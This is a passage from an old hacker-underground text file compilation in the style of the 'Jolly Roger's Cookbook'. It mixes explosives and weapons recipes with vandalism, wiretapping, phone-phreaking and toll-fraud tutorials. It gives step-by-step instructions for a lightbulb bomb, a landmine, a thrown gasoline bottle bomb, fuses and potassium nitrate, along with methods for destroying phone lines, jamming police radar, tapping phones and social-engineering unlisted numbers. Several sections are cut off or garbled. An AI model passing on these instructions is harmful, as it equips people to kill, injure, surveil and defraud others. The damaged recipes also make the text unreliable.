- Draw on lockers or spraypaint on the building that the principal 
is a fascist. 

- Stick a potato in the tailpipe of the principal's car.

-Get a virus from The Black Gate BBS, and infect their computers!  
Most likely they use WordPerfect, Excel, and shit like that.


- USE YOUR IMAGINATION!                    Mondain



Phone related vandalism                     by the Jolly Roger

If you live where there are underground lines then you will be 
able to ruin someone's phone life very easily. All you must do is 
go to their house and find the green junction box that interfaces 
their line (and possibly some others in the neighborhood) with the 
major lines. These can be found just about anywhere but they are 
usually underneath the nearest phone pole. Take a socket wrench 
and loosen the nut on the right. Then just take clippers or a 
sledge hammer or a bomb and destroy the insides and pull up their 
phone cable. Now cut it into segments so it can't be fixed but 
must be replaced (There is a week's worth of work for 'em!!)
Another place to phuck with lines is in new developments.  When 
houses/apartments/condos are still in the plywood and dirt stage, 
the lines are run into junxion boxes.  When the crew goes home for 
the day, plan your attack.  Just destroy the shit out of the box, 
then replace the cover.  Watch em' go nuts as they try to figure
out where the line broke in the walls <DUH!> !

Highway radar jamming                       by The Jolly Roger

Most drivers wanting to make better time on the open road will 
invest in one of those expensive radar detectors. However, this 
device will not work against a gun type radar unit in which the 
radar signal is not present until the cop has your car in his 
sights and pulls the trigger. Then it is TOO LATE for you to slow 
down. A better method is to continuously jam any signal with a 
radar signal of your own. I have tested this idea with the 
cooperation of a local cop and found that his unit reads random 
numbers when my car approached him. It is suprisingly easy to make 
a low power radar transmitter. A nifty little semiconductor called 
a Gunn Diode will generate microwaves when supplied with the 5 to 
10 volt DC and enclosed in the correct size cavity (resonater). An 
8 to 3 terminal regulator can be used to get this voltage from a 
car's 12v system. However, the correct construction and tuning of 
the cavity is difficult without good microwave measurement 
equipment. Police radars commonly operate on the K band at 22 ghz. 
Or more often on the X band at 10.525 ghz. most microwave intruder 
alarms and motion detectors (mounted over automatic doors in 
supermarkets & banks, etc.) contain a Gunn type 
transmitter/receiver combination that transmits about 10 kilowatts 
at 10.525 ghz. These units work perfectly as jammers. If you 
cannot get one locally, write to Microwave Associates in 
Burlington, Massachusettes and ask them for info on 'Gunnplexers' 
for ham radio use. When you get the unit it may be mounted in a 
plastic box on the dash or in a weather-proff enclosure behind the 
PLASTIC grille. Switch on the power when on an open highway. The 
unit will not jam radar to the side or behind the car so don't go 
speeding past the radar trap. An interesting phenomena you will 
notice is that the drivers who are in front of you who are using 
detectors will hit their brakes as you approach large metal signs 
and bridges. Your signal is bouncing off of these objects and 
triggering their radar detectors!       HAVE FUN!

6 parts potassium nitrate (Salt Peter)

Heat this mixture over a LOW flame until it melts, stirring well.

    Small amount of sugar

    Small amount of water


Mix all three of these in equal amounts to fill about 1/10 of the

believe that such a small explosion will literally rip the mailbox 
in half and send it 20 feet into the air! Be careful doing this, 
though, because if you are caught, it is not up to the person 
whose mailbox you blew up to press charges. It is up to the city.

ignition. Once you get behind or near the ignition look for two 
red wires. In older cars red was the standard color, if not, look

Unlisted Phone Numbers                          by The Jolly Roger

There are a couple of different ways of doing this. Let's see if 
this one will help: Every city has one or more offices dedicated 
to assigning numbers to the telephone wire pairs. These offices 
are called DPAC offices and are available to service reps who are 
installing or repairing phones. To get the DPAC number, a service 
rep would call the customer service number for billing information 
in the town that the number is located in that he is trying to get 
the unlisted number of. (Got that?) The conversation would go 
something like this: "Hi, Amarillo, this is Joe from Anytown 
business office, I need the DPAC number for the south side of 
town." This info is usually passed out with no problems, so... if 
the first person you call doesn't have it, try another. REMEMBER, 
no one has ANY IDEA who the hell you are when you are talking on 
the phone, so you can be anyone you damn well please! (heheheheh!) 
When you call the DPAC number, just tell them that you need a 
listing for either the address that you have, or the name. DPAC 
DOES NOT SHOW WHETHER THE NUMBER IS LISTED OR UNLISTED!! Also, if 
you're going to make a habit of chasing numbers down, you might 
want to check into geting a criss-cross directory, which lists 
phone numbers by their addresses. It costs a couple-a-hundred bux, 
but it is well worth it if you have to chase more than one or two 
numbers down!

Fuses                             by The Jolly Roger

You would be surprised how many files are out there that use what 
falls under the category of a "fuse." They assume that you just 
have a few lying around, or know where to get them. Well, in some 
parts of the country, fuses are extremely hard to come by... so 
this file tells you how to make your own. Both fuses presented 
here are fairly simple to make, and are fairly reliable.

SLOW BURNING FUSE
~~~~~~~~~~~~~~~~~ (approx. 2 inches per minute)

Materials needed:

 - Cotton string or 3 shoelaces
 - Potassium Nitrate or Potassium Chlorate
 - Granulated sugar

Procedure:

 - Wash the cotton string or showlaces in HOT soapy water, then 
rinse with fresh water

 - Mix the following together in a glass bowl:
   1 part potassium nitrate or potassium chlorate
   1 part granulated sugar
   2 parts hot water

 - Soak strings or shoelaces in this solution

 - Twist/braid 3 strands together and allow them to dry
 
 - Check the burn rate to see how long it actually takes!!

FAST BURNING FUSE
~~~~~~~~~~~~~~~~~ (40 inches per minute)

Materials needed:

 -Soft cotton string
 -fine black powder (empty a few shotgun shells!)
 -shallow dish or pan

Procedure:

 - moisten powder to form a paste

 - twist/braid 3 strands of cotton together

 - rub paste into string and allow to dry

 - Check the burn rate!!!

Potassium Nitrate is an ingredient in making fuses, among other 
things. Here is how you make it:

Materials needed:

 -3.5 gallons of nitrate bearing earth or other material
 -1/2 cup of wood ashes
 -Bucket or other similar container about 4-5 gallons in volume
 -2 pieces of finely woven cloth, each a bit bigger than the 
  bottom of the bucket
 -Shallow dish or pan at least as large in diameter as the bucket
 -Shallow, heat resistant container
 -2 gallons of water
 -Something to punch holes in the bottom of the bucket
 -1 gallon of any type of alcohol
 -A heat source
 -Paper & tape

Procedure:

 - Punch holes on the inside bottom of the bucket, so that the 
metal is"puckered" outward from the bottom

 - Spread cloth over the holes from the bottom

 - Place wood ashes on the cloth. Spread it out so that it covers 
the entire cloth and has about the same thickness.

 - Place 2nd cloth on top of the wood ashes

 - Place the dirt or other material in the bucket

 - Place the bucket over the shallow container. NOTE: It may need 
support on the bottom so that the holes on the bottom are not 
blocked.

 - Boil water and pour it over the earth very slowly. Do NOT pour 
it all at once, as this will clog the filter on the bottom.

 - Allow water to run through holes into the shallow dish on the 
bottom.

 - Be sure that the water goes through ALL of the earth!

 - Allow water in dish to cool for an hour or so

 - Carefully drain the liquid in the dish away, and discard the 
sludge in the bottom

 - Boil this liquid over a fire for at least two hours. Small 
grains of salt will form - scoop these out with the paper as they 
form

 - When the liquid has boiled down to 1/2 its original volume let 
it sit

 - After 1/2 hour, add equal volume of the alcohol; when this 
mixture is poured through paper, small white crystals appear. This 
is the posassium nitrate.

Purification:

 - Redissolve crystals in small amount of boiling water

 - Remove any crystals that appear

 - Pour through improvised filter then heat concentrated solution 
to dryness.

 - Spread out crystals and allow to dry

--LIGHTBULB BOMBS 2  ver. 4.50                               - Mondain -

     An automatic reaction to walking into a dark room is to turn on the
light. This can be fatal, if a lightbulb bomb has been placed in the overhead
light socket.  A lightbulb bomb is surprisingly easy to make.  It also comes
with its own initiator and electric ignition system.  On some lightbulbs, the
lightbulb glass can be removed from the metal base by heating the base of a
lightbulb in a gas flame, such as that of a blowtorch or gas stove.  This must
be done carefully, since the inside of a lightbulb is a vacuum.  When the glue
gets hot enough, the glass bulb can be pulled off the metal base.  On other
bulbs, it is necessary to heat the glass directly with a blowtorch or
oxy-acetylene torch. In either case, once the bulb and/or base has cooled down
to room temperature or lower, the bulb can be filled with an explosive
material, such as black powder.  If the glass was removed from the metal base,
it must be glued back on to the base with epoxy.  If a hole was put in the
bulb, a piece of duct tape is sufficient to hold the explosive in the in the
bulb.  Then, after making sure that the socket has no power by checking with a
working lightbulb, all that need be done is to screw the lightbulb bomb into
the socket.  Such a device has been used by terrorists or assassins with much
success, since few people would search the room for a bomb without first
turning on the light.
Under water igniters                            by The Jolly Roger

Materials needed:

 -Pack of 10 silicon diodes (available at Radio Shack. you will 
  know you got the right ones if they are very, very small glass 
  objects!)
 -Pack of matches
 -1 candle

Procedure:

 - Light the candle and allow a pool of molten wax to form in the 
top.

 - Take a single match and hold the glass part of a single diode 
against the head. Bend the diode pins around the matchhead so that 
one wraps in an upward direction and thensticks out to the side. 
Do the same with the other wire, but in a downward direction. The 
diodes should now be hugging the matchhead, but its wires MUST NOT 
TOUCH EACH OTHER!

 - Dip the matchhead in wax to give it a water-proof coat. These 
work underwater

 - repeat to make as many as you want

How to use them:

When these little dudes are hooked across a 6v battery, the diode 
reaches what is called breakdown voltage. When most electrical 
components reach this voltage, they usually produce great amounts 
of heat and light, while quickly melting into a little blob. This 
heat is enough to ignite a matchhead. These are recommended for 
use underwater, where most other igniters refuse to work. ENJOY!

Home-brew blast cannon                          by The Jolly Roger

Materials needed:

 -1 plastic drain pipe, 3 feet long, at least 3 1/2 inches in 
  diameter
 -1 smaller plastic pipe, about 6 inches long, 2 inches in 
  diameter
 -1 large lighter, with fluid refills (this gobbles it up!)
 -1 pipe cap to fit the large pipe, 1 pipe cap to fit the small 
  pipe
 -5 feet of bellwire
 -1 SPST rocker switch
 -16v polaroid pot-a-pulse battery
 -15v relay (get this at Radio Shack)
 -Electrical Tape
 -One free afternoon

Procedure:

 - Cut the bell wire into three equal pieces, and strip the ends

 - Cut a hole in the side of the large pipe, the same diameter as 
the small pipe. Thread the hole and one end of the small pipe. 
they should screw together easily.

 - Take a piece of scrap metal, and bend it into an "L" shape, 
then attach it to the level on the lighter:

 /------------------------gas switch is here
 V
 /------
!lighter!!<---metal lever
!!!
!!

Now, every time you pull the 'trigger' gas should flow freely from 
the lighter. You may need to enlarge the 'gas port' on your 
lighter, if you wish to be able to fire more rapidly.

 - Connect two wires to the two posts on the switch

 - Cut two holes in the side of the smaller tube, one for the 
switch on the bottom, and one for the metal piece on the top. 
Then, mount the switch in the bottom, running the wires up and out 
of the top.

 - Mount the lighter/trigger in the top. Now the switch should 
rock easily, and the trigger should cause the lighter to pour out 
gas. Re-screw the smaller tube into the larger one, hold down the 
trigger a bit, let it go, and throw a match in there. If all goes 
well, you should hear a nice big 'THUD!'

 - Get a hold of the relay, and take off the top.

                3                                       the relay
 cc-------------/

Connect (1) to one of the wires coming from the switch. Connect 
(2) to (4), and connect (5) to one side of the battery. Connect 
the remaining wire from the switch to the other side of the 
battery. Now you should be able to get the relay to make a little 
'buzzing' sound when you flip the switch and you should see some 
tiny little sparks.

 - Now, carefully mount the relay on the inside of the large pipe, 
towards the back. Screw on the smaller pipe, tape the battery to 
the side of the cannon barrel (yes, but looks aren't everything!)

 - You should now be able to let a little gas into the barrel and 
set it off by flipping the switch.

 - Put the cap on the back end of the large pipe VERY SECURELY. 
You are now ready for the first trial-run!

To Test:

Put something very, very large into the barrel, just so that it 
fits 'just right'. Now, find a strong guy (the recoil will 
probably knock you on your ass if you aren't careful!). Put on a 
shoulderpad, earmuffs, and possibly some other protective clothing 
(trust the Jolly Roger! You are going to need it!). Hold the 
trigger down for 30 seconds, hold on tight, and hit the switch. 
With luck and the proper adjustments, you should be able to put a 
frozed orange through 1/4 or plywood at 25 feet.

Have fun!                                  -Mondain-

Phone Taps                                      by The Jolly Roger

Here is some info on phone taps. In this file is a schematic for a 
simple wiretap & instructions for hooking up a small tape recorder 
control relay to the phone line.

First, I will discuss taps a little. There are many different 
types of taps. there are transmitters, wired taps, and induction 
taps to name a few. Wired and wireless transmitters must be 
physically connected to the line before they will do any good. 
Once a wireless tap is connected to the line,it can transmit all 
conversations over a limited reception range. The phones in the 
house can even be modifies to pick up conversations in the room 
and transmit them too! These taps are usually powered off of the 
phone line, but can have an external power source. You can get more
information on these taps by getting an issue of Popular
Communications and reading through the ads. Wired taps, on the 
other hand, need no power source, but a wire must be run from the 
line to the listener or to a transmitter. There are obvious 
advantages of wireless taps over wired ones. There is one type of
wireless tap that looks like a normal telephone mike. All you have 
to do is replace the original mike with thisand itwill transmit 
all conversations! There is also an exotic type of wired tap known 
as the 'Infinity Transmitter' or 'Harmonica Bug'. In order to hook 
one of these, it must be installed inside the phone. When someone 
calls the tapped phone & *before* it rings,blows a whistle over 
the line, the transmitter picks up the phone via a relay. The mike 
on the phone is activated so that the caller can hear all of the 
conversations in the room. There is a sweep tone test at     
415/BUG-1111 which can be used to detect one of these taps. If one 
of these is on your line & the test # sends the correct tone, you 
will hear a click. Induction taps have one big advantage over taps 
that must be physically wired to the phone. They do not have to be 
touching the phone in order to pick up the conversation. They work 
on the same principle as the little suction-cup tape recorder 
mikes that you can get at Radio Shack. Induction mikes can be 
hooked up to a transmitter or be wired.

Here is an example of industrial espionage using the phone:
 A salesman walks into an office & makes a phone call. He fakes 
the conversation, but when he hangs up he slips some foam rubber 
cubes into the cradle. The called party can still hear all 
conversations in the room. When someone picks up the phone, the 
cubes fall away unnoticed.
 
A tap can also be used on a phone to overhear what your modem is 
doing when you are wardialing, hacking, or just plain calling a 
bbs (like the White Ruins! Denver, Colorado! 55 megs online! 
Atari! Macintosh! Amiga! Ibm! CALL IT! 303-972-8566! By the way, i 
did this ad without the sysops consent or knowledge!). 

Here is the schematic:
-------)!----)!(------------->
             )!(
  Cap ^      )!(
             )!(
             )!(
             )!(
     ^^^^^---)!(------------->
       ^  100K
       !
       ! <Input

The 100K pot is used for volume. It should be on its highest 
(least resistance) setting if you hook a speaker across the 
output. but it should be set on its highest resistance for a tape 
recorder or amplifier. You may find it necessary to add another
10 - 40K. The capacitor should be around .47 MFD. It's only 
purpose is to prevent the relay in the phone from tripping & 
thinking that you have the phone off of the hook. the audio output 
transformer is available at Radio Shack. (part # 273-138E for 
input). The red & the white wires go to the output device. You may 
want to experiment with the transformer for the best output. 
Hooking up a tape recorder relay is easy. Just hook one of the phone 
wires (usually red) to the the end of one of the relay & the ther 
end just loop around. This bypasses it. It should look like this:

------^^^^^^^^^------------
      ---------
      RELAY^^
(part #275-004 from Radio Shack works fine)

If you think that you line is tapped, the first thing to do is to 
physically inspect the line yourself ESPECIALLY the phones. You 
can get mike replacements with bug detectors built in. However, I 
would not trust them too much. It is too easy to get a wrong 
reading.

How to make a landmine                          by The Jolly Roger

First, you need to get a pushbutton switch. Take the wires of it 
and connect one to a nine volt battery connector and the other to 
a solar igniter (used for launching model rockets). A very thin 
piece of stereo wire will usually do the trick if you are 
desperate, but I recommend the igniter. Connect the other wire of 
the nine-volt battery to one end of the switch. Connect a wire 
from the switch to the other lead on the solar igniter. 

       switch-----------battery
         \                  /
          \                /
           \              /
            \            /
            solar  igniter

                  | 
                  |
              explosive

Now connect the explosive (pipe bomb, m-80, CO2 bomb, etc.) to the 
igniter by attaching the fuse to the igniter (seal it with scotch 
tape). Now dig a hole; not too deep but enough to cover all of the 
materials. Think about what direction your enemy will be coming from
and plant the switch, but leave the button visible (not TOO 
visible!). Plant the explosive about 3-5 feet away from the switch 
because there will be a delay in the explosion that depends on how 
short your wick is, and, if a homemade wick is being used, its 
burning speed. But if you get it right... and your enemy is close 
enough......... BBBBBBBOOOOOOOOOOOOOOOOOOOOOOOOMMMM! hahahaha

Here is how you do it:

 - Get a coke bottle & fill it with gasoline about half full

 - Cram a piece of cloth into the neck of it nice and tight

 - Get a chlorine tablet and stuff it in there. You are going to have
to force it because the tablets are bigger than the opening of the 
bottle. 

 - Now find a suitable victim and wing it in their direction. When it 
hits the pavement or any surface hard enough to break it, and the chlorine
and gasoline mix..... BOOM!!!!!!

Phone Systems Tutorial                          by The Jolly Roger

To start off, we will discuss the dialing procedures for domestic 
as well as international dialing. We will also take a look at the 
telephone numbering plan.

North American Numbering Plan
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In North America, the telephone numbering plan is as follows:

A) a 3 digit Numbering Plan Area (NPA) code , ie, area code
B) a 7 digit telephone # consisting of a 3 digit Central Office 
(CO) code plus a 4 digit station #

These 10 digits are called the network address or destination 
code. It is in the format of:
 
      Area Code         Telephone #
      ---------         -----------

         N*X             NXX-XXXX

Where: N = a digit from 2 to 9
       * = the digit 0 or 1
       X = a digit from 0 to 9

Area Codes
~~~~~~~~~~

Check your telephone book or the seperate listing of area codes 
found on many bbs's. Here are the special area codes (SAC's):

   510 - TWX (USA)
   610 - TWX (Canada)
   700 - New Service
   710 - TWX (USA)
   800 - WATS
   810 - TWX (USA)
   900 - DIAL-IT Services
   910 - TWX (USA)

The other area codes never cross state lines, therefore each state 
must have at least one exclusive NPA code. When a community is 
split by a state line, the CO #'s are often interchangeable (ie, 
you can dial the same number from two different area codes).

TWX (Telex II) consists of 5 teletype-writer area codes. They are 
owned by Western Union. These SAC's may only be reached via other 
TWX machines. These run at 110 baud (last I checked! They are most 
likely faster now!). Besides the TWX #'s, these machines are 
routed to normal telephone #'s. TWX machines always respond with 
an answerback. For example, WU's FYI TWX # is (910) 279-5956. The 
answerback for this service is "WU FYI MAWA".

If you don't want to but a TWX machine, you can still send TWX 
messages using Easylink [800/325-4112]. However you are gonna have 
to hack your way onto this one!

700:

700 is currently used by AT&T as a call forwarding service. It is 
targeted towards salesmen on the run. To understand how this 
works, I'll explain it with an example. Let's say Joe Q. Salespig 
works for AT&T security and he is on the run chasing a phreak 
around the country who royally screwed up an important COSMOS 
system. Let's say that Joe's 700 # is (700) 382-5968. Everytime 
Joe goes to a new hotel (or most likely SLEAZY MOTEL), he dials a 
special 700 #, enters a code, and the number where he is staying. 
Now, if his boss received some important info, all he would do is 
dial (700) 382-5968 and it would ring wherever Joe last progammed 
it to. Neat, huh?

800:

This SAC is one of my favourites since it allows for toll free 
calls. INWARD WATS (INWATS), or Inward Wide Area 
Telecommunications Service is the 800 #'s that we are all familiar 
with. 800 #'s are set up in service areas or bands. There are 6 of 
these. Band 6 is the largest and you can call a band 6 # from 
anywhere in the US except the state where the call is terminated 
(that is why most companies have one 800 number for the countery 
and then another one for their state.) Band 5 includes the 48 
contiguous states. All the way down to band 1 which includes only 
the states contiguous to that one. Therefore, less people can 
reach a band 1 INWATS # than a band 6 #.

Intrastate INWATS #'s (ie, you can call it from only 1 state) 
always have a 2 as the last digit in the exchange (ie, 800-NX2-
XXXX). The NXX on 800 #'s represent the area where the business is 
located. For example, a # beginning with 800-431 would terminate 
at a NY CO.

800 #'s always end up in a hunt series in a CO. This means that it 
tries the first # allocated to the company for their 800 lines; if 
this is busy, it will try the next #, etc. You must have a minimum 
of 2 lines for each 800 #. For example, Travelnet uses a hunt 
series. If you dial (800) 521-8400, it will first try the # 
associated with 8400; if it is busy it will go to the next 
available port, etc. INWATS customers are billed by the number of 
hours of calls made to their #.

OUTWATS (OUTWARD WATS): OUTWATS are for making outgoing calls 
only. Largecompanies use OUTWATS since they receive bulk-rate 
discounts. Since OUTWATS numbers cannot have incoming calls, they 
are in the format of:

   (800) *XXX-XXXX

Where * is the digit 0 or 1 (or it may even be designated by a 
letter) which cannot be dialed unless you box the call. The *XX 
identifies the type of service and the areas that the company can 
call.

Remember:

 INWATS + OUTWATS = WATS EXTENDER

900:

This DIAL-IT SAC is a nationwide dial-it service. It is use for 
taking television polls and other stuff. The first minute 
currently costs an outrageous 50-85 cents and each additional 
minute costs 35-85 cents. Hell takes in a lot of revenue this way!

Dial (900) 555-1212 to find out what is currently on this service.

CO CODES
~~~~~~~~

These identify the switching office where the call is to be 
routed. The following CO codes are reserved nationwide:

   555 - directory assistance
   844 - time. These are now in!
   936 - weather the 976 exchange
   950 - future services
   958 - plant test
   959 - plant test
   970 - plant test (temporary)
   976 - DIAL-IT services

Also, the 3 digit ANI & ringback #'s are regarded as plant test 
and are thus reserved. These numbers vary from area to area. 

You cannot dial a 0 or 1 as the first digit of the exchange code 
(unless using a blue box!). This is due to the fact that these 
exchanges (000-199) contains all sorts of interesting shit such as 
conference #'s, operators, test #'s, etc.

950:

Here are the services that are currently used by the 950 exchange:

   1000 - SPC
   1022 - MCI Execunet
   1033 - US Telephone
   1044 - Allnet
   1066 - Lexitel
   1088 - SBS Skyline

These SCC's (Specialized Common Carriers) are free from fortress 
phones! Also, the 950 exchange will probably be phased out with 
the introduction of Equal Access

Plant Tests:

These include ANI, Ringback, and other various tests.

976:

Dial 976-1000 to see what is currently on the service. Also, many 
bbs's have listings of these numbers.

N11 codes:
----------
Bell is trying to phase out some of these, but they still exist in 
most areas. 

  011 - international dialing prefix
  211 - coin refund operator
  411 - directory assistance
  611 - repair service
  811 - business office
  911 - EMERGENCY

International Dialing
~~~~~~~~~~~~~~~~~~~~~

With International Dialing, the world has been divided into 9 
numbering zones. To make an international call, you must first 
dial: International Prefix + Country code + National #

In North America, the international dialing prefix is 011 for 
station-to-station calls. If you can dial International #'s 
directly in your area then you have International Direct Distance 
Dialing (IDDD).

The country code, which varies from 1 to 3 digits, always has the 
world numbering zone as the first digit. For example, the country 
code for the United Kingdom is 44, thus it is in world numbering 
zone 4. Some boards may contain a complete listing of other 
country codes, but here I give you a few:

   1 - North America (US, Canada, etc.)
  20 - Egypt
 258 - Mozambique
  34 - Spain
  49 - Germany
  52 - Mexico (southern portion)
   7 - USSR
  81 - Japan
  98 - Iran (call & hassle those bastards!)

If you call from an area other than North America, the format is 
generally the same. For example, let's say that you wanted to call 
the White House from Switzerland to tell the prez that his 
numbered bank account is overdrawn (it happens, you know! ha ha). 
First you would dial 00 (the SWISS international dialing refix), 
then 1 (the US country code), followed by 202-456-1414 (the 
national # for the White House. Just ask for Georgy and give him 
the bad news!)

Also, country code 87 is reserved for Maritime mobile service, ie, 
calling ships:

   871 - Marisat (Atlantic)
   871 - Marisat (Pacific)
   872 - Marisat (Indian)

International Switching:
------------------------

In North America there are currently 7 no. 4 ESS's that perform 
the duty of ISC (Inter-nation Switching Centers). All 
international calls dialed from numbering zone 1 will be routed 
through one of these "gateway cities". They are:

  182 - White Plains, NY
  183 - New York, NY
  184 - Pittsburgh, PA
  185 - Orlando, Fl
  186 - Oakland, CA
  187 - Denver, CO
  188 - New York, NY

The 18X series are operator routing codes for overseas access (to 
be furthur discussed with blue boxes). All international calls use 
a signaling service called CCITT.It is an international standard 
for signaling.

Ok.. there you go for now! If you wanna read more about this, read 
part two which is the next file #36 in the Jolly Roger's cookbook!

Phone Systems Tutorial part II                  by The Jolly Roger

Part II will deal with the various types of operators, office 
heirarchy, & switching equipment.

Operators
~~~~~~~~~

There are many types of operators in the network and the more 
common ones will be discussed.

TSPS Operator:

The TSPS [(Traffic Service Position System) ass opposed to This 
Shitty Phone Service] Operator is probably the bitch (or bastard, 
for the female libertationists out there) that most of us are used 
to having to deal with. Here are his/her responsibilities:

1) Obtaning billing information for calling card or third number 
calls

2) Identifying called customer on person-to-person calls.

3) Obtaining acceptance of charges on collect calls.

4) Identifying calling numbers. This only happens when the calling 
# is not automatically recorded by CAMA (Centralized Automatic 
Message Accounting) & forwarded from the local office. This could 
be caused by equipment failures (ANIF- Automatic Number 
Identification Failure) or if the office is not equipped for CAMA 
(ONI- Operator Number Identification).

<I once has an equipment failure happen to me & the TSPS operator 
came on and said, "What # are you calling FROM?" Out of curiosity, 
I gave her the number to my CO, she thanked me & then I was 
connected to a conversation that appeared to be between a frameman 
& his wife. Then it started ringing the party I wanted to 
originally call & everyone phreaked out (excuse the pun). I 
immediately dropped this dual line conference!

You should not mess with the TSPS operator since she KNOWS which 
number that you are calling from. Your number will show up on a 
10-digit LED read-out (ANI board). She also knows whether or not 
you are at a fortress phone & she can trace calls quite readily! 
Out of all of the operators, she is one of the MOST DANGEROUS.

INWARD operator:

This operator assists your local TSPS ("0") operatorin connecting 
calls. She will never question a call as long as the call is 
withing HER SERVICE AREA. She can only be reached via other 
operators or by a blue box. From a blue box, you would dial 
KP+NPA+121+ST for the INWARD operator that will help you connect 
any calls within that NPA only. (Blue Boxing will be discussed in 
a future file).

DIRECTORY ASSISTANCE Operator:

This is the operator that you are connected to when you dial: 411 
or NPA-555-1212. She does not readily know where you are calling 
from. She does not have access to unlisted numbers, but she DOES 
know if an unlisted # exists for a certain listing.

There is also a directory assistance operator for deaf people who 
use teletypewriters. If your modem can transfer BAUDOT [(45.5 
baud). One modem that I know of that will do this is the Apple Cat 
acoustic or the Atari 830 acoustic modem. Yea I know they are hard 
to find... but if you wanna do this.. look around!) then you can 
call him/her up and have an interesting conversation. The # is: 
800-855-1155. They use the standard Telex abbreviations such as GA 
for go ahead. they tend to be nicer and will talk longer than your 
regular operators. Also, they are more vulnerable into being 
talked out of information through the process of "social 
engineering" as Chesire Catalyst would put it. 

<Unfortunately, they do not have access to much. I once 
bullshitted with one of these operators a while back and I found 
out that there are 2 such DA offices that handle TTY. One is in 
Philadelphia and the other is in California. They have approx. 7 
operators each. most of the TTY operators think that their job is 
boring (based on an official "BIOC poll"). They also feel that 
they are under-paid. They actually call up a regular DA # to 
process your request (sorry, no fancy computers!)

Other operators have access to their own DA by dialing 
KP+NPA+131+ST (MF).

CN/A operators:

CN/A Operators are operators that do exactly the opposite of what 
directory assistance operators are for. In my experience, these 
operators know more than the DA op's do & they are more 
susceptable to "social engeneering." It is possible to bullshit a 
CN/A operator for the NON-PUB DA # (ie, you give them the name & 
they give you the unlisted number. See the article on unlisted 
numbers in this cookbook for more info about them.). This is due 
to the fact that they assume that you are a fellow company 
employee. Unfortunately, the AT&T breakup has resulted in the 
break-up of a few NON-PUB DA #'s and policy changes in CN/A

INTERCEPT Operator:

The intercept operator is the one that you are connected to when 
there are notenough recordings available to tell you that the # 
has been disconnected or changed. She usually says, "What # you 
callin'?" with a foreign accent. This is the lowest operator 
lifeform. Even though they don't know where you are calling from, 
it is a waste or your time to try to verbally abuse them since 
they usually understand very little English anyway.

Incidentally, a few area DO have intelligent INTERCEPT Operators.

OTHER Operators:

And then there are the: MObile, Ship-to-Shore, Conference, Marine 
Verify, "Leave Word and Call Back," Rout & Rate 
(KP+800+141+1212+ST), & other special operators who have one 
purpose or another in the network.

Problems with an Operator> Ask to speak to their supervisor... or 
better yet the Group Chief (who is the highest ranking official in 
any office) who is the equivalent of the Madame ina whorehouse.

By the way, some CO's that willallow you to dial a 0 or 1 as the 
4th digit, will also allow you to call special operators & other 
fun Tel. Co. #'s without a blue box. This is ver rare, though! For 
example,212-121-1111 will get you a NY Inward Operator.

Office Hierarchy
~~~~~~~~~~~~~~~~

Every switching office in North America (the NPA system), is 
assigned an office name and class. There are five classes of 
offices numbered 1 through 5. Your CO is most likely a class 5 or 
end office. All long-distance (Toll) calls are switched by a toll 
office which can be a class 4, 3, 2, or 1 office. There is also a 
class 4X office callen an intermediate point. The 4X office is a 
digital one that can have an unattended exchange attached to it 
(known as a Remote Switching Unit (RSU)).

The following chart will list the Office #, name, & how many of 
those office exist (to the best of my knowledge) in North America:

Class                 Name           Abb          # Existing
-----        ----------------------- ---      -----------------
> 1          Regional Center          RC                   12
> 2          Sectional Center         SC                   67
> 3          Primary Center           PC                  230
> 4          Toll Center              TC                1,300
> 4P         Toll Point               TP                 n/a
> 4X         Intermediate Point       IP                 n/a
> 5          End Office               EO               19,000
> 6          RSU                     RSU                 n/a

When connecting a call from one party to another, the switching 
equipment usually tries to find the shortest route between the 
class 5 end office of the caller & the class 5 end officeof the 
called party. If no inter-office trunks exist between the two 
parties, it will then move upward to the next highest office for 
servicing calls (Class 4). If the Class 4 office cannot handle the 
call by sending it to another Class 4 or 5 office, it will then be 
sent to the next highest office in the hierarchy (3). The 
switching equipment first uses the high-usage interoffice trunk 
groups, if they are busy then it goes to the fina; trunk groups on 
the next highest level. If the call cannot be connected, you will 
probably get a re-order [120 IPM (interruptions per minute) busy 
signal] signal. At this time, the guys at Network Operations are 
probably shitting in their pants and trying to avoid the dreaded 
Network Dreadlock (as seen on TV!).

It is also interesting to note that 9 connections in tandem is 
called ring-around-the-rosy and it has never occured in telephone 
history. This would cause an endless loop connection [a neat way 
to really screw up the network].

The 10 regional centers in the US & the 2 in Canada are all 
interconnected. they form the foundation of the entire telephone 
network. Since there are only 12 of them, they are listed below:

Class 1 Regional Office Location   NPA
--------------------------------   ---
Dallas 4 ESS                       214
Wayne, PA                          215
Denver 4T                          303
Regina No. 2SP1-4W (Canada)        306
St. Louis 4T                       314
Rockdale, GA                       404
Pittsburgh 4E                      412
Montreal No. 1 4AETS (Canada)      504

Basic Alliance Teleconferencing                 Courtesy of the Jolly Roger

Introduction:
------------
This phile will deal with accessing, understanding and using the Alliance
Teleconferencing Systems.... it has many sections and for best use should
be printed out...enjoy...

Alliance:
--------
Alliance Teleconferencing is an independant company which allows the general
public to access and use it's conferencing equipment.  Many rumors have
been floating apound that Alliance is a subsidary of AT&T.
Well, they are wrong.  As stated above, Alliance is an entirely independant
company.  They use sophisticated equipment to allow users to talk to many
people at once.

The Number:
---------
Alliance is in the 700 exchange, thus it is not localized, well, not
in a way.  Alliance is only in certain states, and only
residents of these certain states can access by dialing direct.  This,
however, will be discussed in a later chapter.  The numbers for alliance are
as follows:
     0-700-456-1000 (chicago)
              -1001 (los angeles)
              -1002 (chicago)
              -1003 (houston)
              -2000 (?)
              -2001 (?)
              -2002 (?)
              -2003 (?)
              -3000 (?)
              -3001 (?)
              -3002 (?)
              -3003 (?)

The locations of the first 4 numbers are known and i have stated them.
However, the numbers in the 200x and 300x are not definately known.
Rumor has it that the pattern repeats itself but this has not been proven.

Dialing:
-------
As stated before, Alliance is only in certain stated and only these states
can access them via dialing direct.  However, dialing direct causes your
residence to be charged for the conference and conference bills are not low!!!
Therefore, many ways have been discovered to start a conference without
having it billed to ones house.  They are as follows:
     
     1) Dialing through a PBX
     2) Incorporating a Blue Box
     3) Billing to a loop
     4) Billing to a forwarded call

I am sure there are many more but these are the four i will deal with.

Dialing through a PBX:
------- ------- - ---
Probably the easiest method of creating a free conference is through a PBX.
Simply call one in a state that has Alliance, input the PBX's code,
dial 9 for an outside line and then dial alliance.
An example of this would be:

PBX: 800-241-4911

When it answers it will give you a tone.  At this tone input your code.

Code: 1234

After this you will receive another tone, now dial 9 for an outside line. 
You will now hear a dial tone.  Simply dial Alliance from this point and
the conference will be billed to the PBX.

Using a Blue Box:
----- - ---- ---
Another rather simple way of starting a conference is with a Blue Box.
